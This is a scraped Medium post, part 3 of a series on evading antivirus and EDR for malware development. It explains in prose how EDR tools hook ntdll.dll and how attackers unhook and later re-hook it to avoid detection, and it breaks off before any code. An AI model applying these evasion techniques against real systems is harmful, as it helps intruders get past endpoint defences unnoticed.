# https://medium.com/@0xHossam/unhooking-memory-object-hiding-3229b75618f7

<!DOCTYPE html><html lang="en" data-rh="lang" dir="ltr"><body><div id="root"><div class="a b c"><a href="https://medium.com/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><div></div><div class="m c"><div class="m n o p c" style="transform: translateY(0px);"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://play.google.com/store/apps/details?id=com.medium.reader&amp;referrer=utm_source%3DmobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="az i"><div class="ac ak ba bb bc r bd be"><div class="bn" aria-describedby="searchResults" aria-labelledby="searchResults" aria-haspopup="listbox" role="listbox"></div><div class="bo bp ac"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ak bf bg bh ab bi bj bk bl bm" placeholder="Search" value=""></div></div></div><div class="i l x fp fq"><span data-dd-action-name="Susi presentation tracker new_post_topnav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerWriteButton" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg>Write</div></a></span></div><div class="l k j e"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSearchButton" rel="noopener follow" href="https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------" data-discover="true"><div class="bg b bh ab eb fr fs ac r ft fu fv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Search</span></div></a></div><div class="ge i l k"><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" rel="noopener follow" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" data-discover="true">Sign in</a></span></p></div></div></div><div class="m"><div><div class="bn" role="tooltip" aria-describedby="1" aria-labelledby="1"><div tabindex="-1" class="bf"><button class="ak gf ao ac r aq fr gg gh gi" aria-label="user options menu" data-testid="headerUserIcon"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak gk"></div></div></button></div></div></div></div></div></div><div class="ac"><div class="cb i l k j cc" style="width: 0px;"></div><div class="cd bi ce cf cg ch" style="width: calc(100% + 0px);"><div class="m"><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div data-focus-lock-disabled="disabled"><div class="ry" role="dialog" aria-modal="true" tabindex="-1"><div class="ww wx bi ed wy wz xa aq xb hd xc" aria-hidden="true" role="presentation"></div><div class="xd wy xe xf xg ww ed fk xh xi xj lp xk xl xm xn xo xp xq xr xs xt ac cv xu" aria-hidden="true"><div class="xv gy"></div></div></div></div><div data-focus-guard="true" tabindex="-1" style="width: 1px; height: 0px; padding: 0px; overflow: hidden; position: fixed; top: 1px; left: 1px;"></div><div class="gl gm gn go gp m"><div class="ac ci"><div class="cp bi gq gr gs gt"></div></div><article><div class="m"><div class="m"><span class="m"></span><section><div><div class="fw gz xw hb hc hd"></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><div><h1 id="30d8" class="pw-post-title hj hk hl bg hm hn ho hp hq hr hs ht hu hv hw hx hy hz ia ib ic id ie if ig ih ii ij ik il bl" data-testid="storyTitle" data-selectable-paragraph="">AV/EDR Evasion | Malware Development P — 3</h1><div><div class="speechify-ignore ac cw"><div class="speechify-ignore bi m"><div class="ac im in io ip iq ir is it iu iv iw"><div class="ac r iw"><div class="ac ix"><div><div class="bn" aria-describedby="3" aria-labelledby="3" role="tooltip"><div tabindex="-1" class="bf"><a rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---byline--3229b75618f7---------------------------------------" data-discover="true"><div class="m iy iz by ja jb"><div class="m fr"><img alt="Hossam Ehab" class="m fk by bz ca de" width="32" height="32" loading="lazy" data-testid="authorPhoto" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="jc by m bz ca fw o jd gk"></div></div></div></a></div></div></div></div><span class="bg b bh ab bl"><div class="je ac r"><div class="ac r jf"><div class="ac r"><div><div class="bn" aria-describedby="4" aria-labelledby="4" role="tooltip"><div tabindex="-1" class="bf"><span class="bg b bh ab bl"><a class="ah ai aj fo al am an ao ap aq ar as at jg" data-testid="authorName" rel="noopener follow" href="https://medium.com/@0xHossam?source=post_page---byline--3229b75618f7---------------------------------------" data-discover="true">Hossam Ehab</a></span></div></div></div></div><div class="jh bn"></div><button class="uk yp aq ac ci r yq yr ys" style="border: 1px solid rgba(19, 19, 19, 0.525);"><span class="bg b bh ab bl bi"><span class="bn yt">Follow</span></span></button></div></div></span></div><div class="ac r ji"><span class="bg b bh ab eb"><div class="ac ag"><span data-testid="storyReadTime">16 min read</span><div class="jj jk m" aria-hidden="true"><span class="m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span></div><span data-testid="storyPublishDate">May 14, 2023</span></div></span></div></div><div class="ac cw jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka"><div class="i l x fp fq r"><div class="kq m"><div class="ac r kr ks"><div class="pw-multi-vote-icon fr kt ku kv kw"><span data-dd-action-name="Susi presentation tracker clap_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerClapButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F3229b75618f7&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&amp;user=Hossam+Ehab&amp;userId=e6a0bffd3db&amp;source=---header_actions--3229b75618f7---------------------clap_footer------------------" data-discover="true"><div><div class="bn" aria-describedby="5" aria-labelledby="5" role="tooltip"><div tabindex="-1" class="bf"><div class="kx aq ky kz la lb ao lc ld le kw" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></div></a></span></div><div class="pw-multi-vote-count m lf lg lh li lj lk ll"><div><div class="bn" aria-describedby="65" aria-labelledby="65" role="tooltip"><div tabindex="-1" class="bf"><p class="bg b ec ab eb"><button class="ah ai aj fo al am an ao ap aq ar as at au av yu lu">556<span class="m i h g sd se"></span></button></p></div></div></div></div></div></div><div><div class="bn" aria-describedby="6" aria-labelledby="6" role="tooltip"><div tabindex="-1" class="bf"><button class="aq kx lp lq ac r fs lr ls" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lo"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bg b ec ab eb"><span class="pw-responses-count ln lo">1</span></p></button></div></div></div></div><div class="ac r kb kc kd ke kf kg kh ki kj kk kl km kn ko kp"><div class="lt l k j e"></div><div class="i l"><div><div class="bn" aria-describedby="7" aria-labelledby="7" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_footer"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerBookmarkButton" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F3229b75618f7&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&amp;source=---header_actions--3229b75618f7---------------------bookmark_footer------------------" data-discover="true"><span class=""><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div><div class="fk lv cu"><div class="m ag"><div class="ac ci"><div class="lw lx ly lz ma mb cp bi"><div class="ac"><span data-dd-action-name="Susi presentation tracker post_audio_button"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D3229b75618f7&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&amp;source=---header_actions--3229b75618f7---------------------post_audio_button------------------" data-discover="true"><div><div class="bn" aria-describedby="53" aria-labelledby="53" role="tooltip"><div tabindex="-1" class="bf"><button aria-label="Listen" data-testid="audioPlayButton" class="ah fs aj fo al am an mc ap aq ar fe md me ls mf mg mh mi mj t mk ml mm mn mo mp mq v mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Listen</p></div></button></div></div></div></a></span></div></div></div></div></div><div class="bn" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bn" aria-describedby="9" aria-labelledby="9" role="tooltip"><div tabindex="-1" class="bf"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="ah fs aj fo al am an mc ap aq ar fe md me ls mf mg mh mi mj t mk ml mm mn mo mp mq v mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="k j e"><p class="bg b bh ab eb">Share</p></div></button></div></div></div></div></div></div></div></div></div></div><h2 id="e661" class="mu mv hl bg mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr bl" data-selectable-paragraph="">Unhooking &amp; Memory Object Hiding</h2><p id="de96" class="pw-post-body-paragraph ns nt hl nu b nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op he bl" data-selectable-paragraph="">Before we delve into the topic, allow me to reintroduce myself and provide a brief overview of this playlist. My name is Hossam Ehab and I’m here to guide you through the realm of anti-virus (AV) evasion and the techniques used to bypass Endpoint Detection and Response (EDR) systems. This playlist aims to assist you in red team operations by providing insights into the intricate world of AV/EDR evasion.</p><p id="0206" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Today, we will focus on two crucial aspects: Unhooking and Memory Object Hiding. These techniques play a significant role in evading AV and EDR systems, ensuring the stealth and effectiveness of malware development. In the red teaming process, encountering EDRs is almost inevitable, making it essential to equip ourselves with the necessary knowledge to counter their detection mechanisms.</p><p id="62bb" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">To gain a comprehensive understanding of Unhooking and Memory Object Hiding, it is recommended to read the previous two parts of this series. These articles provide detailed insights into the subject matter:</p><p id="bf1a" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Part 1 : <a class="ah ov" rel="noopener" href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5" data-discover="true">AV/EDR Evasion | Malware Development | by Hossam Ehab | Medium</a><br>Part 2 : <a class="ah ov" rel="noopener" href="https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354" data-discover="true">AV/EDR Evasion | Malware Development — P2 | by Hossam Ehab | Medium</a></p><p id="5975" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">By exploring these articles, you will gain a solid foundation in AV/EDR evasion techniques, setting the stage for our discussion on Unhooking and Memory Object Hiding. Stay tuned for an in-depth exploration of these topics and their practical applications in red team operations.</p><p id="e2ea" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Remember, knowledge and preparation are key in navigating the ever-evolving landscape of AV/EDR evasion. Let’s continue this journey together, empowering ourselves with the tools and techniques necessary to achieve success.</p></div></div></div><div class="ac ci ow ox oy oz" role="separator"><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc pd"></span><span class="pa by bn pb pc"></span></div><div class="he hf hg hh hi"><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="ece5" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl pe" data-selectable-paragraph=""><span class="m pf pg ph bp pi pj pk pl pm fr">To</span> fully grasp the concept of unhooking, it is crucial to understand the underlying principle of “hooking” itself. APIs (application programming interfaces) serve as a means for software code to execute specific actions within a computer system. In Windows, there are APIs like syscall that enable direct system or kernel-level access for executing instructions.</p><p id="ba9d" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">In the realm of EDR (Endpoint Detection and Response) solutions, these security tools often employ a technique called “hooking” to monitor and identify suspicious activities. This is achieved by injecting their own code into a specific Windows component known as ntdll.dll, which acts as a gateway for various system operations.</p><p id="2c3b" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">Now, unhooking comes into play as a method employed by attackers to replace the hooked version of ntdll.dll with a fresh, unhooked version. They carry out this process after Windows has already loaded the EDR-hooked version during the process launch. By doing so, the EDR solution remains unaware of any subsequent code execution, losing its ability to monitor the return address for API calls. Consequently, it becomes ineffective in detecting and responding to potential threats.</p><p id="bb4f" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">In more sophisticated attacks, hackers may take their efforts a step further by “re-hooking” the EDR solution towards the end of their operation. This involves restoring the original hooked version of ntdll.dll, effectively erasing any traces of suspicious activity and making it appear as though nothing untoward had occurred.</p><p id="1db2" class="pw-post-body-paragraph ns nt hl nu b nv oq nx ny nz or ob oc od os of og oh ot oj ok ol ou on oo op he bl" data-selectable-paragraph="">By understanding the mechanics of hooking and unhooking, it becomes evident how attackers can manipulate EDR systems to evade detection and carry out their malicious actions undetected.</p><figure class="pq pr ps pt pu pv pn po paragraph-image"><div role="button" tabindex="0" class="pw px fr py bi pz"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pn po pp"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*vW_p2wVPA0O-jItN.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*vW_p2wVPA0O-jItN.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*vW_p2wVPA0O-jItN.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*vW_p2wVPA0O-jItN.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*vW_p2wVPA0O-jItN.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*vW_p2wVPA0O-jItN.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*vW_p2wVPA0O-jItN.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*vW_p2wVPA0O-jItN.png 640w, https://miro.medium.com/v2/resize:fit:720/0*vW_p2wVPA0O-jItN.png 720w, https://miro.medium.com/v2/resize:fit:750/0*vW_p2wVPA0O-jItN.png 750w, https://miro.medium.com/v2/resize:fit:786/0*vW_p2wVPA0O-jItN.png 786w, https://miro.medium.com/v2/resize:fit:828/0*vW_p2wVPA0O-jItN.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*vW_p2wVPA0O-jItN.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*vW_p2wVPA0O-jItN.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, 